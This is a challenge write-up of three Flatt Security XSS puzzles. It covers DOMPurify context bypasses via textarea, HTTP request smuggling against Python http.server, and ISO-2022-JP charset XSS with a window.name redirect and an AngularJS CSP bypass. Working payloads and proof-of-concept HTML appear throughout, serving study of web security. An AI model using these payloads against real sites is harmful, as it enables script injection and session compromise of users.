There were three xss challenges from Flatt Security , which were all really good I really liked the last challenge which was authored by the legend Masato Kinugawa and I managed to solve it too :p

# Challenge 1 by @hamayanhamayan

This was the most easiest one from the others.

hamayan\src\index.js

```js
const createDOMPurify = require('dompurify');
const { JSDOM } = require('jsdom');
const window = new JSDOM('').window;
const DOMPurify = createDOMPurify(window);

app.get('/', (req, res) => {
  const message = req.query.message;
  if (!message || typeof message !== 'string') {
    return res.redirect(`/?message=Yes%2C%20<b>we%20can<%2Fb>%21`);
  }
  const sanitized = DOMPurify.sanitize(message); // [1]
  res.view("/index.ejs", { sanitized: sanitized });
});
```

On the server side on line [1] , Dompurify was used to sanitize the html from the `message` parameter and then the sanitized string from dompurify was passed to the template `index.ejs`
We have two injection points here , so the sanitized string is placed at the two places `<%- sanitized %>`
```js
    <p class="message"><%- sanitized %></b></p>
    <form method="get" action="">
        <textarea name="message"><%- sanitized %></textarea>
```


![image](https://github.com/user-attachments/assets/3958697d-c279-4d2c-a99e-7e9167393fad)

Well Dompurify latest version is used so a direct bypass isn't possible, let's focus on the second insertion point which is inside `template` element. As in the first one there is no chance.
By default, the  `template` element's content is not rendered, as we can see in the screenshot the injected html appears as it is ,not rendered as html.

Dompurify isn't aware of the context where the sanitized data will be in use i.e `template` element in our case. So it's possible to get xss here even though state of the art DOMPurify is in use.

```html
<a id="</textarea><img src=x onerror=alert()>">shirley</a>
```

https://yeswehack.github.io/Dom-Explorer/dom-explore , as can be seen the above payload is consider safe by dompurify as the string `</textarea><img src=x onerror=alert()>` is inside the attribute value.
![image](https://github.com/user-attachments/assets/c361ba80-4406-4db9-93e8-aef00f9d3c20)

Things gets interesting when the same payload is used in context like this

```html
<textarea name="message"> <a id="</textarea><img src=x onerror=alert()>">shirley</a> </textarea>
```

![image](https://github.com/user-attachments/assets/b316663f-778e-4928-bfe5-4911cab5d53c)

When this is parsed by the browser , as earlier mentioned the content inside of `textarea` element doesn't gets rendered so as soon as the  `</textarea>` is seen by the browser it will close the `textarea` context right there. And rest of the part is no longer inside `textarea` so it gets render now as HTML. Thus giving us an xss vector `<img src=x onerror=alert()>`

https://challenge-hamayan.quiz.flatt.training/?message=%3Ca%20id=%22%3C/textarea%3E%3Cimg%20src=x%20onerror=alert()%3E%22%3E
![image](https://github.com/user-attachments/assets/0d44738c-eeb3-42e9-ab26-fb970df57120)

---------------

# Challenge 2 by @ryotkak

A very interesting challenge indeed

http://34.171.202.118/

This application allows you to  create drafts, but no html is allowed. On the server side it html encodes the input. Although the html encoded input goes through a custom xss sanitizer on the client side and then used in `innerHTML` but it passes html encoded version `&lt; &gt;` it looks useless so it suggest that there might be another vuln:

![image](https://github.com/user-attachments/assets/ca96cba1-4baf-4f76-bac1-96eff6121259)

When we create a draft, it provides us with an id in the url like this http://34.171.202.118/?draft_id=fbca1697-5c42-41a9-abdc-3628bdb5f054 when this page is load the following things happen in the background

```js
        window.onload = async function () {
            const params = new URLSearchParams(window.location.search);
            if (params.has('draft_id')) {
                const resp = await fetch(`/api/drafts?id=${encodeURIComponent(params.get('draft_id'))}`);
                const content = await resp.text();
                document.getElementById('input').value = content.slice(0, 100);
                previewContent();
            }
        }
```

It takes the `draft_id` parameter value and use it in a fetch call to the `/api/drafts?id=` endpoint. The value of the id is url encoded. The response from this endpoint is then passed to a custom sanitizer, the sanitized output is then passed to the sink `innerHTML`

```js
        function previewContent() {
            const input = document.getElementById('input').value;
            document.getElementById('preview').innerHTML = sanitizeHtml(input); // just in case
        }
```

The response return from the `/api/drafts?id=` is going to be html encoded so it's clear that the goal of this challenge is to find a way to make the `/api/drafts?id=` endpoint return our payload which is not html encoded and find a bypass for the Sanitizer then.

To get a start let's try to find a bypass for the sanitizer first, it's not dompurify so it shouldn't give much trouble to us:

```js
        const SANITIZER_CONFIG = {
            DANGEROUS_TAGS: [
                'script',
                'iframe',
                'style',
                'object',
                'embed',
                'meta',
                'link',
                'base',
                'frame',
                'frameset',
                'svg',
                'math',
                'template',
            ],

            ALLOW_ATTRIBUTES: false
        }

        function sanitizeHtml(html) {
            const doc = new DOMParser().parseFromString(html, "text/html");
            const nodeIterator = doc.createNodeIterator(doc, NodeFilter.SHOW_ELEMENT);

            while (nodeIterator.nextNode()) {
                const currentNode = nodeIterator.referenceNode;
                if (typeof currentNode.nodeName !== "string" || !(currentNode.attributes instanceof NamedNodeMap) || typeof currentNode.remove !== "function" || typeof currentNode.removeAttribute !== "function") {
                    console.warn("DOM Clobbering detected!");
                    return "";
                }
                if (SANITIZER_CONFIG.DANGEROUS_TAGS.includes(currentNode.nodeName.toLowerCase())) {
                    currentNode.remove();
                } else if (!SANITIZER_CONFIG.ALLOW_ATTRIBUTES && currentNode.attributes) {
                    for (const attribute of currentNode.attributes) {
                        currentNode.removeAttribute(attribute.name);
                    }
                }
            }

            return doc.body.innerHTML;
        }
```

From the `SANITIZER_CONFIG` you can see, it has list of elements which it regards as dangerous and `ALLOW_ATTRIBUTES` key is set to false which might indicate that we can't have any attributes and the elements listed in the `DANGEROUS_TAGS` in our html.

The dirty string passed to `sanitizeHtml` , is first used to create a DOM Tree using the `DOMParser` and then it iterates over each node , first checks for the nodeName property which basically returns element name and checks if it's in the `DANGEROUS_TAGS` array or not if it's there it removes the node completely (means it's child will also be removed)
The second check is for the attributes , as `ALLOW_ATTRIBUTES` is set to false it should remove all the attributes.

This the minimal structure of how a sanitizer is actually implemented, if you look at DOMPurify inner working it also creates a DOM Tree first then iterates and remove the dangerous stuffs.

In the `DANGEROUS_TAGS` list I saw that `textarea` isn't there, so I thought that might be helpful.

```js
sanitizeHtml(`<textarea><a id="</textarea><img src=x onerror=alert()>"></textarea>`)
'<textarea>&lt;a id="</textarea><img onerror="alert()">"&gt;
```
We can see with this vector , the `onerror` attribute remained there which was weird. As I assumed this would take care of all the attributes. I did setup breakpoint to understand where the magic happens but still couldn't get. It seems it just ignores iterating over that specific element.

```js
                    for (const attribute of currentNode.attributes) {
                        currentNode.removeAttribute(attribute.name);
                    }
```

So this was the payload which I thought was intented, required user interaction but ok atleast we have something :

```html
<textarea><a/id="</textarea><text/src='x'onmouseover='alert()'>shirley">
```


Moving on the server side code

```python
class RequestHandler(BaseHTTPRequestHandler):
    protocol_version = 'HTTP/1.1'
    content_type_text = 'text/plain; charset=utf-8'
    content_type_html = 'text/html; charset=utf-8'

    def do_GET(self):
        parsed_path = urlparse.urlparse(self.path)
        path = parsed_path.path
        query = urlparse.parse_qs(parsed_path.query)
        if path == "/":
            self.send_response(200)
            self.send_header('Cache-Control', 'max-age=3600')
            self.send_data(self.content_type_html, bytes(index_html, 'utf-8'))
        elif path == "/api/drafts":
            draft_id = query.get('id', [''])[0]
            if draft_id in drafts:
                escaped = html.escape(drafts[draft_id])
                self.send_response(200)
                self.send_data(self.content_type_text, bytes(escaped, 'utf-8'))
            else:
                self.send_response(200)
                self.send_data(self.content_type_text, b'')
        else:
            self.send_response(404)
            self.send_data(self.content_type_text, bytes('Path %s not found' % self.path, 'utf-8'))

    def do_POST(self):
        content_length = int(self.headers.get('Content-Length'))
        if content_length > 100:
            self.send_response(413)
            self.send_data(self.content_type_text, b'Post is too large')
            return
        body = self.rfile.read(content_length)
        draft_id = str(uuid4())
        drafts[draft_id] = body.decode('utf-8')
        self.send_response(200)
        self.send_data(self.content_type_text, bytes(draft_id, 'utf-8'))

    def send_data(self, content_type, body):
        self.send_header('Content-Type', content_type)
        self.send_header('Connection', 'keep-alive')
        self.send_header('Content-Length', len(body))
        self.end_headers()
        self.wfile.write(body)
```



The routing for 404 pages looked interesting as it was reflecting the path as it is without any sanitization even though the `Content-Type` for this endpoint is `text/plain` it can still be usefull if we can find a way to serve a 404 response instead for the original /api/drafts?id= request.

The `Content-Length` request header check looked kinda sus , when we are dealing Python the first thing which comes into my mind is Desync attacks (thanks to @kevin_mizu for his work on this area )


This challenge turned out to be a very similar one as this https://mizu.re/post/twisty-python

The problem , the application checks the `Content-Length` to make sure it's not more than 100. If it's more than 100 it sends a 413 status code and calls `send_data` method which sends back the response. But the connection is never close?

From Mizu's blogpost *So, if the application doesn't read the body, and the connection isn't closed (keep-alive), by default http.server will ignore the Content-Length header and interpret the request body as part of the subsequent request.*

Let's try the theory

```html
<form action="http://34.171.202.118/" method="POST" enctype="text/plain" target="shirley">
    <textarea name="http"></textarea>
</form>

<script>
    document.forms[0].http.name = `GET /shirley HTTP/1.1\r\na:a\r\nX:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`;
    setTimeout('document.forms[0].submit()',3000)
</script>
```

![image](https://github.com/user-attachments/assets/b777c493-76c8-41e2-b7a2-a04f34d9142a)

In the request logs on the server you can see , we have two requests. The second which is a GET request to the path `/shirley` is taken from the request body. So Indeed we can perform desync attack here. Interestingly by sending the same request two times (submit form twice), the second time the index page is loaded it will return the response of the request which was smuggled in the POST body. Thats why you see the `Path /shirley not found` reponse in the screenshot above

Btw just an example this how the connection would be close, now if you use the same poc it doesn't shows only the POST request :

```python
    def do_POST(self):
        content_length = int(self.headers.get('Content-Length'))
        if content_length > 100:
            self.send_response(413)
            self.send_data(self.content_type_text, b'Post is too large')
            self.close_connection = True // I added this line
            return
```

The server allows us to send POST request to any path, so we can make a POST request to the http://34.171.202.118/api/drafts?id=ba6c79a8-aafb-458d-8ee9-108c11ae86d4 endpoint with the smuggled request in the body which should contain the xss payload. Now when the same form is submitted two times, the next time a request to the    /api/drafts?id=ba6c79a8-aafb-458d-8ee9-108c11ae86d4 endpoint is made the response for this will be of the smuggled request which is nothing but the 404 page containing the xss payload.

The below submits the form two times with some time delays, also we are targetting the form to be submitted inside the iframe to make sure everything is carried in the same tab because we want the requests to have the same Connection IDs

```html
<iframe name="shirley" style="position:fixed; top:0; left:0; bottom:0; right:0; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;" src="http://34.171.202.118/?draft_id=ba6c79a8-aafb-458d-8ee9-108c11ae86d4"></iframe>
<form action="http://34.171.202.118/api/drafts?id=ba6c79a8-aafb-458d-8ee9-108c11ae86d4" method="POST" enctype="text/plain" target="shirley">
    <textarea name="http"></textarea>
</form>

<script>

    document.forms[0].http.name = `GET /<textarea><a/id="</textarea><text/src='x'onmouseover='alert()'>shirley"> HTTP/1.1\r\na:a\r\nX:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`;
    setTimeout('document.forms[0].submit()',3000)
    setTimeout('document.forms[0].submit()',6000)
    setTimeout('frames[0].location.href="http://34.171.202.118/?draft_id=ba6c79a8-aafb-458d-8ee9-108c11ae86d4"',4000)
</script>
```

After submitting the form two times which hopefully poisons the response for the /api/drafts?id=ba6c79a8-aafb-458d-8ee9-108c11ae86d4 endpoint. we redirect the frame to the /?draft_id=ba6c79a8-aafb-458d-8ee9-108c11ae86d4 endpoint where the js code will take the `draft_id` parameter id and make a fetch call to /api/drafts?id= endpoint which will return `Path /xss payload not found` as the response which is what passed to the sanitizer then to the innerHTML sink

Later talking with my friend I got to know we can include more attributes to make it interaction afert  that ,  I noticed that just this is enough to bypass the sanitizer

```js
sanitizeHtml(`<img/id/src/y onerror=alert()>`)
'<img src="" onerror="alert()">'
```

![image](https://github.com/user-attachments/assets/569a7ea0-1974-4cab-b0be-96d806ae5f35)

-------------------------------------

# Challenge 3 by @kinugawamasato

Well at first , this challenge looked impossible no matter from what angle I look at it. I mean check the source everything looks really good, that's all the relevant code for this challenge. The Dompurify config ensures we can't use any attributes neither `data-*` nor `aria-*` which is then used to create a blob url and loaded inside an iframe??

```js
      const sanitizedHtml = DOMPurify.sanitize(html, { ALLOWED_ATTR: [], ALLOW_ARIA_ATTR: false, ALLOW_DATA_ATTR: false });
      const blob = new Blob([sanitizedHtml], { "type": "text/html" });
      const blobURL = URL.createObjectURL(blob);
      input.value = sanitizedHtml;
      window.open(blobURL, "iframe");
```

My friend told me if you look into what the author main area of work is you will soon realize what the challenge is about.
I then looked at the server used to setup the challenge site, it was Python `http.server` nothing fancy, when I paid attention to the response header I noticed that it's `Content-Type: text/html` see no charset specified this was a good lead... because I knew from Masato's blogpost he has done a lot of work on Charset based xss in the past and also recently there was a blogpost related to this from SonarSource plus Mizu also posted a tweet about it.

https://www.sonarsource.com/blog/encoding-differentials-why-charset-matters/
https://x.com/kevin_mizu/status/1812882499875319959

![image](https://github.com/user-attachments/assets/c0b654ba-7663-43aa-a20b-931d5b41c74b)


Mizu's screenshot should be self explanatory, when there is no charset specified browser tries to be smart and it tries to guess the charset this is similar to the mime sniffing behaviour where browser tries to guess the Mime type in cases where no `Content-Type` header is specified at all.
The SonarSource blogpost explain all this very well so I would recommend reading it if you haven't already

```html
<a id="\x1b$B"></a>\x1b(B<a id="><img src=x onerror=alert(1)>"></a>
```

`\x1b$B` , `\x1b(B` are both different escape sequences. You can look at the below diagram which is taken from the same SonarSource blogpost to understand what these escape sequences does

![image](https://github.com/user-attachments/assets/a5f30c3b-3c6d-4a1c-b2f6-1ad6e931b994)

In simple terms , consider the sequence `\x1b$B` lets you escape the `"` context of the id attribute by ignoring the next `"` occurence and by  using this  `\x1b(B` escape sequence we make the rest of the part treated as ASCII ,so the browser sees the `img` element with `onerror` attribute and happily gives us xss.

Coming back to our challenge, as in the Mizu's tweet we can see it easily allows you bypass Dompurify ,we hide the xss vectors inside attribute. 
Scrolling through Masato's old tweets my friend found this gold  https://x.com/kinugawamasato/status/1309937578443849730?s=46&t=SSyMk5f3kBs791RxVEILAg
![image](https://github.com/user-attachments/assets/05f0a6bc-af1a-4b15-a74c-71111817d651)

It's about a Charset XSS bug in  Blob API due to the ignorance of the charset specified in the `type` key. This allowed Masato to do a similar xss as explained by Mizu and SonarSource.

Here's poc fron the Chromium bug report:

```js
        var blob = new Blob([`aaa\u001B$@<textarea>\u001B(B<script>alert('xss');alert(document.charset)<\/script></textarea>bbb`], {
          type: "text/html;charset=utf-8"//this charset should be used
        });
        location=window.URL.createObjectURL(blob);
```

You can see using the `type` option, the charset is defined there. But seems Chromium was ignoring it which led to such bypass:

```html
aaa\u001B$@<textarea>\u001B(B<script>alert('xss');alert(document.charset)<\/script></textarea>bbb
```

Funny enough we came across  `textarea` again in the 3rd challenge also, as already discussed content inside of textarea isn't rendered by the browser so normally the script element should not be rendered.But due charset problem, using the escape sequences in ISO-2022-JP encoding we can make it to ignore the starting `textarea` element thus the `script` element is no longer inside `textarea`. This will allow the script element to be rendered and an alert will popup.

As the reported bug by Masato is fixed, Blob API now respects the charset specified in the `type` key. But still if you want to reproduce it you can omit the `charset` attribute and you can replicate the same which is expected to show weird behaviours as we are not specifying a charset:

```js
        var blob = new Blob([`aaa\u001B$@<textarea>\u001B(B<script>alert('xss');alert(document.charset)<\/script></textarea>bbb`], {
          type: "text/html"//this charset is removed
        });
        location=window.URL.createObjectURL(blob);
```

This is how the element gets rendered and we also get the alert popup

![image](https://github.com/user-attachments/assets/926ccbc0-49f7-455f-a56b-ed774143ff3e)

This vector is special because it doesn't makes the use of any attributes which is what we need for our challenge and if you pay attention in challenge site there also the charset isn't specified for the Blob API

```js
      const sanitizedHtml = DOMPurify.sanitize(html, { ALLOWED_ATTR: [], ALLOW_ARIA_ATTR: false, ALLOW_DATA_ATTR: false });
      const blob = new Blob([sanitizedHtml], { "type": "text/html" });
      const blobURL = URL.createObjectURL(blob);
      input.value = sanitizedHtml;
      window.open(blobURL, "iframe");
```


![image](https://github.com/user-attachments/assets/90e38ac5-7726-49a0-bda5-17b8f816ca10)

For style it's even more strict removes the whole node, similar behaviour we can see for other possible options xmp,plaintext,title,etc

![image](https://github.com/user-attachments/assets/722253fc-a959-4f01-bcd9-02a4963226f1)


I was stuck here for a very long time and at one moment  I randomly started playing with just `<`,`>` inside of `style` element. That's when I noticed that dompurify only removes the STYLE node upon encountering a closing or a starting element inside the STYLE contents.  

![image](https://github.com/user-attachments/assets/70e4254c-0469-45b8-a88a-61215a91dfc6)

Now all I needed to do was find  a way to put something in place of the space after `<` which would remain as it is during Dompurify sanitization process but when rendered by the browser it gets ignored so that it becomes `<script>` something like a NULL character.

```
aaa <style>\u001B(B  < script>alert('xss');alert(document.charset)< /script> </style> bbb
```

I thought why not just use the escape sequence ? And yeah that turned out to be working so fucking well. This was passed as it is from Dompurify but when rendered by the browser, the script alement appeared as `<script>` not `<SOMECHARACTERscript>` so that was a good sign . I was testing in Firefox at that time and noticed that the same doesn't works in Chrome

```html
aaa<style>\u001B(Bsssss<\u001B(Bscript>alert('xss');alert(document.charset)<\u001B(B/script></style>bbb
```


Give it a try in ff then in chrome

```js
 var blob = new Blob([`aaa <style> \u001B(B<\u001B(B/style><\u001B(Bimg src=x onerror=alert()> </style> bbb`], {
          type: "text/html" //this charset should be used
 });
location=window.URL.createObjectURL(blob);
```

Here in this screenshot you can see how both the browsers interpret this differently
![image](https://github.com/user-attachments/assets/4b9fcb81-72c8-49fe-b806-2a2d81184767)


To make this work in Chrome, the solution is very simple we just need to add `\x1b$B` at the starting 

```js
 var blob = new Blob([`aaa \x1b$B <style> \u001B(B<\u001B(B/style><\u001B(Bimg src=x onerror=alert()> </style> bbb`], {
          type: "text/html" //this charset should be used
 });
location=window.URL.createObjectURL(blob);
```

![image](https://github.com/user-attachments/assets/3ae6f1b3-675c-4d4b-bec1-0846d165a390)



Still few more hurdles to solve, if you look at the poc we are using for Blob we are loading the blob url by making a redirect to it. This seems to be necessary we can even see a warning message in firefox when we load this vector in the challenge site. As the blob url is loaded inside an iframe.

*The character encoding of a framed document was not declared. The document may appear different if viewed without the document framing it.*

![image](https://github.com/user-attachments/assets/d7132215-3010-4918-948a-cc02064b1df4)


The blobUrl is loaded like this

```html
<iframe name="iframe" style="width: 80%;height:200px"></iframe>

<script>
window.open(blobURL, "iframe");
```

window.open targets the url to the iframe element with the name `iframe`. After thinking for a while I thought of trying window hijacking, basically the idea is setting the `window.name` property to `iframe`. So because of this the current top window has the name "iframe" when `window.open(blobURL, "iframe")` is executed instead of targetting the iframe it will target the current top window thus making a full redirect to the blobUrl instead of loading it inside the iframe which is what we wantttt.

In Chrome, even for different origins if the tab in which they are opened is same. They all will share the same `window.name` property ,this thing doesn't works in Firefox.

I decided to host the following poc on my site:

```html
<script>
  let params = new URLSearchParams(document.location.search);
  window.name = params.get("name")
  window.location.href = atob(location.hash.slice(1))
</script>
```

And this worked, but now the only task left was to bypass CSP which was fairly easy, as cdnjs.cloudflare.com is in the allowlist we can load angular and bypass the csp completely.

```
default-src 'none';script-src 'sha256-EojffqsgrDqc3mLbzy899xGTZN4StqzlstcSYu24doI=' cdnjs.cloudflare.com; style-src 'unsafe-inline'; frame-src blob:
```

This was the final payload which I came up with:

```html
aaa\x1B$@<style>\x1B(B<\x1B(Bscript src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.0/angular.js"><\x1B(B/script><\x1B(Bimg/ng-app/ng-csp/src/ng-on-error=$event.target.ownerDocument.defaultView.alert($event.target.ownerDocument.defaultView.origin)></style>bbb
```

By opening this url you will get an alert on the challenge site ;)
https://sudistark.github.io/window-name-redirect.html?name=iframe#aHR0cHM6Ly9jaGFsbGVuZ2Uta2ludWdhd2EucXVpei5mbGF0dC50cmFpbmluZy8/aHRtbD1hYWElMUIkQCUzQ3N0eWxlJTNFJTFCKEIlM0MlMUIoQnNjcmlwdCUyMHNyYz0lMjJodHRwczovL2NkbmpzLmNsb3VkZmxhcmUuY29tL2FqYXgvbGlicy9hbmd1bGFyLmpzLzEuOC4wL2FuZ3VsYXIuanMlMjIlM0UlM0MlMUIoQi9zY3JpcHQlM0UlM0MlMUIoQmltZy9uZy1hcHAvbmctY3NwL3NyYy9uZy1vbi1lcnJvcj0kZXZlbnQudGFyZ2V0Lm93bmVyRG9jdW1lbnQuZGVmYXVsdFZpZXcuYWxlcnQoJGV2ZW50LnRhcmdldC5vd25lckRvY3VtZW50LmRlZmF1bHRWaWV3Lm9yaWdpbiklM0UlM0Mvc3R5bGUlM0ViYmI=

![image](https://github.com/user-attachments/assets/be4f06b7-b270-47e1-b463-ef57aaaabc6c)


If you come this far reading this thankyou so much I hope you liked reading it and pardon if there are any mistakes lots of new stuff which I got to know during this timespan trying to solve this challenges only , thanks to Flatt Security for creating such awesome challenges I really learned a lot by trying to solve them.
